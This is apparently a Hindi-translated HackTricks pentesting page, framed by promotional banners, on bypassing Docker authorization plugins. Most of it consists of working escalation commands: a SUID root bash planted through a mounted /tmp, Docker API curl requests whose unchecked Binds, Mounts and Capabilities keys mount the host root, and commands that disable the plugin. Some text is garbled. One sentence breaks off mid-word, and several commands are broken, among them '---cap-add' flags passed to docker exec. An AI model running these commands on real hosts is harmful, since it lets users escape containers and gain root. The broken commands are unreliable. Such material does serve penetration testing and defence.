<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks क्लाउड ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 ट्विटर 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ ट्विच 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 यूट्यूब 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की अनुमति** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS परिवार**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>


**Docker** की आउट-ऑफ-द-बॉक्स **अधिकृतता** मॉडल सब कुछ या कुछ नहीं है। किसी भी उपयोगकर्ता को जो भी अनुमति होती है वह डॉकर डेमन तक पहुंचने के लिए किसी भी डॉकर क्लाइंट कमांड को चला सकता है। डॉकर के इंजन API का उपयोग करके डेमन से संपर्क करने वाले कॉलर्स के लिए भी यही सत्य है। यदि आपको **अधिक पहुंच नियंत्रण** की आवश्यकता है, तो आप अधिकृतता प्लगइन बना सकते हैं और उन्हें अपने डॉकर डेमन कॉन्फ़िगरेशन में जोड़ सकते हैं। एक अधिकृतता प्लगइन का उपयोग करके, डॉकर प्रशासक डॉकर डेमन तक पहुंच को प्रबंधित करने के लिए विस्तारशील पहुंच नीतियों को कॉन्फ़िगर कर सकते हैं।

# मूलभूत संरचना

Docker ऑथ प्लगइन बाहरी प्लगइन हैं जिन्हें आप डॉकर डेमन द्वारा अनुरोधित क्रियाओं की अनुमति देने या निरस्त करने के लिए उपयोग कर सकते हैं। जब CLI या इंजन API के माध्यम से डॉकर डेमन को HTTP अनुरोध भेजा जाता है, तो प्रमाणीकरण उपप्रणाली अनुरोध को स्थापित प्रमाणीकरण प्लगइन (या प्लगइन्स) को पारित करती है। अनुरोध में उपयोगकर्ता (कॉलर) और कमांड संदर्भ होता है। प्लगइन को यह निर्णय लेने के लिए जिम्मेदार होता है कि क्या अनुरोध को स्वीकार किया जाए या नहीं।

नीचे दिए गए क्रमबद्ध आरेखण चित्रों में एक अनुमति और अनुमति निरस्ति अधिकृतता फ्लो दिखाए गए हैं:

![अनुमति देने वाली फ्लो](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![अनुमति निरस्ति फ्लो](https://docs.docker.com/engine/extend/images/authz\_deny.png)

प्लगइन को भेजे गए प्रत्येक अनुरोध में **प्रमाणित उपयोगकर्ता, HTTP हैडर और अनुरोध/प्रतिक्रिया शरीर** शामिल होते हैं। प्लगइन को केवल उपयोगकर्ता का नाम और प्रमाणीकरण विधि पारित की जाती है। सबसे महत्वपूर्ण बात यह है कि कोई भी उपयोगकर्ता क्रेडेंशियल या टोकन पारित नहीं होते हैं। अंत में, सभी अनुरोध/प्रतिक्रिया शरीर अधिकृतता प्लगइन को नहीं भेजे जाते हैं। केवल वे अनुरोध/प्रतिक्रिया शरीर भेजे जाते हैं जिनमें `Content-Type` या `text/*` या `application/json` होता है।

`exec` जैसे HTTP कनेक्शन को हाइजैक कर सकने वाले कमांड्स के ल
## अनुमति नहीं `run --privileged`

### न्यूनतम अधिकार
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### एक कंटेनर चलाना और फिर एक विशेषाधिकारित सत्र प्राप्त करना

इस मामले में सिस्टम व्यवस्थापक ने उपयोगकर्ताओं को वॉल्यूम माउंट करने और `--privileged` फ्लैग के साथ कंटेनर चलाने या कंटेनर को कोई अतिरिक्त क्षमता देने की अनुमति नहीं दी है:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
यदापि, एक उपयोगकर्ता **चल रहे कंटेनर के भीतर एक शैल बना सकता है और इसे अतिरिक्त अधिकार दे सकता है**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
अब, उपयोगकर्ता किसी भी [**पहले चर्चित तकनीक**](./#privileged-flag) का उपयोग करके कंटेनर से बाहर निकल सकता है और होस्ट में **विशेषाधिकारों को बढ़ा सकता है**।

## लिखने योग्य फ़ोल्डर माउंट करें

इस मामले में सिस्टम व्यवस्थापक ने उपयोगकर्ताओं को `--privileged` फ़्लैग के साथ कंटेनर चलाने से रोक दिया है या कंटेनर को कोई अतिरिक्त क्षमता देने की अनुमति दी है, और उसने केवल `/tmp` फ़ोल्डर को माउंट करने की अनुमति दी है:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
ध्यान दें कि शायद आप `/tmp` फ़ोल्डर को माउंट नहीं कर सकते हैं, लेकिन आप एक **अलग लिखने योग्य फ़ोल्डर** को माउंट कर सकते हैं। आप निम्नलिखित कमांड का उपयोग करके लिखने योग्य निर्देशिकाओं को खोज सकते हैं: `find / -writable -type d 2>/dev/null`

**ध्यान दें कि एक लिनक्स मशीन में सभी निर्देशिकाएं suid बिट का समर्थन नहीं करेंगी!** सुइड बिट का समर्थन करने वाले निर्देशिकाओं की जांच करने के लिए `mount | grep -v "nosuid"` कमांड चलाएं। उदाहरण के लिए, आमतौर पर `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` और `/var/lib/lxcfs` suid बिट का समर्थन नहीं करते हैं।

ध्यान दें कि यदि आप **`/etc` या किसी अन्य फ़ोल्डर को माउंट** कर सकते हैं जिसमें **कॉन्फ़िगरेशन फ़ाइलें** होती हैं, तो आप उन्हें डॉकर कंटेनर में रूट के रूप में बदलकर उन्हें **होस्ट में दुरुपयोग करने** और विशेषाधिकारों को बढ़ाने के लिए उपयोग कर सकते हैं (शायद `/etc/shadow` को संशोधित करके)
{% endhint %}

## जांच नहीं की गई API एंडपॉइंट

इस प्लगइन को कॉन्फ़िगर करने वाले सिसएडमिन की जिम्मेदारी होगी कि वह नियंत्रित करें कि प्रत्येक उपयोगकर्ता किस क्रिया को और किस प्रिविलेज के साथ कर सकता है। इसलिए, यदि एडमिन एंडपॉइंट्स और विशेषताओं के साथ एक **ब्लैकलिस्ट** दृष्टिकोण अपनाता है, तो वह शायद कुछ ऐसे एंडपॉइंट्स को **भूल जाएंगे** जो एक हमलावर को **विशेषाधिकार बढ़ाने** की अनुमति दे सकते हैं।

आप डॉकर API की जांच कर सकते हैं [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## जांच नहीं की गई JSON संरचना

### रूट में बाइंड करें

संभव है कि जब सिसएडमिन ने डॉकर फ़ायरवॉल कॉन्फ़िगर किया था, तो उन्होंने [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) के कुछ महत्वपूर्ण पैरामीटर जैसे "**Binds**" के बारे में **भूल जाएंगे**।\
निम्नलिखित उदाहरण में, इस त्रुटि का दुरुपयोग करने के लिए संगठन को बनाने और चलाने की अनुमति हो सकती है जो मेज़बान के रूट (/) फ़ोल्डर को माउंट करता है:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
ध्यान दें कि इस उदाहरण में हम **`Binds`** पैरामीटर को JSON में एक रूट स्तर की कुंजी के रूप में उपयोग कर रहे हैं, लेकिन API में इसे **`HostConfig`** कुंजी के तहत दिखाया जाता है।
{% endhint %}

### HostConfig में Binds

**Binds in root** के साथ एक ही निर्देशों का पालन करें और Docker API को यह **अनुरोध** करें:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### रूट में माउंट

**रूट में बाइंड** के साथ समान निर्देशों का पालन करें और इस **अनुरोध** को Docker API में कार्यान्वयन करें:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### HostConfig में Mounts

डॉकर API को यह **अनुरोध** करके **रूट में बाइंड के साथ** उसी निर्देश का पालन करें:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## जांच नहीं की गई JSON विशेषता

संभव है कि जब सिसएडमिन ने डॉकर फ़ायरवॉल कॉन्फ़िगर किया था, तो उन्होंने [API](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) के "**HostConfig**" के अंदर "**Capabilities**" जैसे किसी महत्वपूर्ण पैरामीटर की कुछ महत्वपूर्ण विशेषता के बारे में **भूल गए** हों। निम्नलिखित उदाहरण में, इस गलत कॉन्फ़िगरेशन का दुरुपयोग करके हम SYS\_MODULE क्षमता के साथ एक कंटेनर बना सकते हैं और चला सकते हैं:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** वह कुंजी है जिसमें सामान्यतः कंटेनर से बाहर निकलने के लिए **दिलचस्प** **विशेषाधिकार** होते हैं। हालांकि, जैसा कि हम पहले ही चर्चा कर चुके हैं, ध्यान दें कि इसके बाहर Binds का उपयोग करना भी काम करता है और रोकथाम को दौर करने की अनुमति देता है।
{% endhint %}

## प्लगइन को अक्षम करना

यदि **सिस्टम प्रशासक** ने **प्लगइन** को **अक्षम** करने की क्षमता को **भूल गए** हैं, तो आप इसका लाभ उठा सकते हैं और इसे पूरी तरह से अक्षम कर सकते हैं!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
उच्चारण प्लगइन को **उन्नति के बाद पुनः सक्रिय करें**, अन्यथा **डॉकर सेवा की पुनरारंभ काम नहीं करेगी**!

## ऑथ प्लगइन बाईपास व्राइटअप्स

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# संदर्भ

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स रेपो और हैकट्रिक्स-क्लाउड रेपो में पीआर जमा करके**।

</details>
